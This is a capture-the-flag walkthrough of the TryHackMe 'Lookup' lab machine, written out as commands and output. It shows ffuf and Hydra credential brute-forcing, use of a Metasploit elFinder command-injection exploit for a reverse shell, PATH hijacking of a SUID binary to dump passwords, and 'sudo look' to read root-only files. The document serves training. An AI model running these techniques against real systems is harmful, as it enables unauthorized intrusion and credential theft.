# [Lookup](https://tryhackme.com/room/lookup)

<a href="https://tryhackme.com/room/lookup"><figure><img src="./assets/logo.png" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> Test your enumeration skills on this boot-to-root machine.

Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/lookup), made by [tryhackme](https://tryhackme.com/p/tryhackme) and [josemlwdf](https://tryhackme.com/p/josemlwdf).

Dificulty: `Easy`

Solved in: `2026/05/10`

# Table of Contents

...

# Writeup

## Reconhecimento

Following the usual steps, I checked if the provided ip was working:

```bash
$ ping -c 3 <MACHINE_IP>
PING <MACHINE_IP> (<MACHINE_IP>) 56(84) bytes of data.
64 bytes from <MACHINE_IP>: icmp_seq=1 ttl=62 time=141 ms
64 bytes from <MACHINE_IP>: icmp_seq=2 ttl=62 time=140 ms
64 bytes from <MACHINE_IP>: icmp_seq=3 ttl=62 time=140 ms

--- <MACHINE_IP> ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 139.688/140.034/140.636/0.426 ms
```

And thus did a `nmap`[^nmap] to see the available ports:

```bash
$ nmap -T4 <MACHINE_IP>
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 16:44 UTC
Nmap scan report for <MACHINE_IP>
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
```

I got a `ssh:22` and `http:80`. Well, checking the website...

<figure><img src="./assets/lookup0.png" title="DNS fail"></figure>

For some reason the webbrowser changed the IP to `lookup.thm`, but that's not in the DNS. So was `lookup.thm` added to the local DNS `/etc/hosts`:

```
/etc/hosts
<MACHINE_IP>   lookup.thm
```

And everything was once more right.

<figure><img src="./assets/lookup1.png" title="Landing page"></figure>

It's a login page, to which I have no credentials. Nor for the `ssh` for that matter! So I decided to go further with `gobuster`[^gobuster]:

```bash
$ gobuster dir -u http://lookup.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 719]
/login.php            (Status: 200) [Size: 1]
```

But none of those links are really useful. `/index.php` is the landing page, and `/login.php` the redirect after the login. I tried searching for exploits in Apache 2.4.41 (information gotten through a more thorough `nmap`) but none were really aplicable. I decided to do a brute force, then...

Using `ffuf`[^ffuf], a [username wordlist](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames-dup.txt), and a bogus password `password`, I tried, with little hope, to see if the developer had left the system vulnerable.

```bash
$ ffuf -w xato-net-10-million-usernames-dup.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password" -H "Content-Type: application/x-www-form-urlencoded"
```

So it ran for a while, and it seems the default size was `74`. So, I filtered it out with `-fs 74` and reran the command:

```bash
$ ffuf -w xato-net-10-million-usernames-dup.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password" -H "Content-Type: application/x-www-form-urlencoded" -fs 74

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: xato-net-10-million-usernames-dup.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=password
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 74
________________________________________________

jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 141ms]
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 2853ms]
```

Two users! `admin` and `jose`. Following suit, then, I tried applying the same brute-force method, though now using `admin` as username and rockyou[^rockyou] as the password wordlist.

```bash
$ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
```

This time the default size was `62`, so after filtering it out with `-fs 62`:

```bash
$ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 62 -s
<A_PASS>
```

A password! Now, with `admin` and `<A_PASS>`...

<figure><img src="./assets/lookup2.png" title="Login fail"></figure>

Weird. The combination was invalid. I know it is crazy to do so, but I then tried the exact same password with the user `jose`.

## Exploration

The login worked, but I had to add the subdomain `files.lookup.thm` to the local DNS too. Either way, the access brought me to a file browser.

<figure><img src="./assets/lookup3.png" title="Login success"></figure>

All files had random words, without much context, except two of them.

```
thislogin.txt
jose : <A_PASS>
```

```
credentials.txt
think : nopassword
```

I tried logging in on `ssh` with the `credentials.txt` info, but it wasn't valid. I even compiled all random words into one file and bruteforced it both as user and password, but even then.

Thus I looked into exploits.

```bash
$ searchsploit elfinder
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)            | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                  | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Meta | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution  | php/webapps/51864.txt
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Since the `elfinder` version was `2.1.47`, matching exactly with the `PHP Connector` exploit (`46481`), I decided to use it. It was available in `metasploit`,[^ms] so I configured it there. The only real settings was `rhosts` for the machine IP and `lhost` for my own IP.

After the exploit, I was then given a reverse shell[^rv] and soon searched for useful files. There was a SQL...

```bash
meterpreter > pwd
/var/www/files.lookup.thm/public_html/elFinder/php
meterpreter > download MySQLStorage.sql
[*] Downloading: MySQLStorage.sql -> /home/kali/MySQLStorage.sql
[*] Downloaded 1.14 KiB of 1.14 KiB (100.0%): MySQLStorage.sql -> /home/kali/MySQLStorage.sql
[*] Completed  : MySQLStorage.sql -> /home/kali/MySQLStorage.sql
```

But no info inside it. I tried escalating to another terminal but `elfinder` literally deletes `.php` files before executing them.

So I followed on and tried `sudo -l`. It asked for a password.

As a last hope, I searched for files with SUID root permission. Within those, I mystical command appeared:

```bash
$ find / -perm -4000 2>/dev/null; echo "finished"
...
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
...
```

`/usr/sbin/pwm` isn't an usual command. Executing it...

```bash
$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

It runs another command, `id`. There is a non-zero chance the command is executed relatively, which allows for PATH hijacking. Got to work.

```bash
$ cd /tmp
$ touch id
$ chmod +x id
$ echo "#!/bin/bash\nsudo sh" > id
$ cat id
#!/bin/bash
sudo sh
$ export PATH=/tmp:$PATH
$ which id
/tmp/id
```

Sadly trying to simply execute a root terminal wasn't enough. So I tried the second idea.

```bash
$ /usr/bin/id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command `id` returns values related to the user, so I just need to change them to root, no? Trying so:

```bash
$ echo "#!/bin/bash\necho \"uid=0(root)  gid=0(root) groups=0(root)\"" > id

$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: root
[-] File /home/root/.passwords not found
```

Once more it didn't work, but this time because the script also looks for the file `/home/user/.passwords`. Well, time to look around the user homes and see who's got that.

```bash
$ ls -la /home/think
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 5 root  root  4096 May 10 21:39 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
```

> By the way, that `user.txt` is the user flag, but currently I don't have the proper privileges to read it.

Now, running `pwm` leads to a password list:

```bash
$ echo "#!/bin/bash\necho \"uid=1000(think) gid=1000(think) groups=1000(think)\"" > id
$ pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
...
jose.9298
jose.2856171
```

All in the format `jose` followed by a random combination of numbers, special characters, other words... Now, with a proper password list, I returned to `ssh` and `hydra`[^hydra] to make a brute force attack:

```bash
$ hydra -l think -P ~/Desktop/josewl.txt ssh://lookup.thm
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 23:07:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: <T_PASS>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 23:07:45
```

Getting it right with the user `think` and the password `<T_PASS>`.

```bash
think@<MACHINE_IP>:~$ whoami
think
```

## Privileges escalation

From here it is simple. First, get the user flag:

```bash
think@<MACHINE_IP>:~$ pwd
/home/think
think@<MACHINE_IP>:~$ cat user.txt
<FLAG_USER>
```

Then follow `sudo -l` to see what could I do to become root.

```bash
think@<MACHINE_IP>:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on <MACHINE_IP>:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on <MACHINE_IP>:
    (ALL) /usr/bin/look
```

Oh. I don't need to. I can just read every file in the system with `/usr/bin/look`. Taking a shot in the dark:

```bash
think@<MACHINE_IP>:~$ sudo look "" /root/root.txt
<FLAG_ROOT>
```

I got the root flag without escalating privileges.

[^nmap]: https://github.com/nmap/nmap
[^gobuster]: https://github.com/OJ/gobuster
[^srchspl]: https://www.exploit-db.com/searchsploit
[^ms]: https://www.metasploit.com/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling
[^rockyou]: https://weakpass.com/wordlists/rockyou.txt
[^hydra]: https://github.com/vanhauser-thc/thc-hydra
[^ffuf]: https://github.com/ffuf/ffuf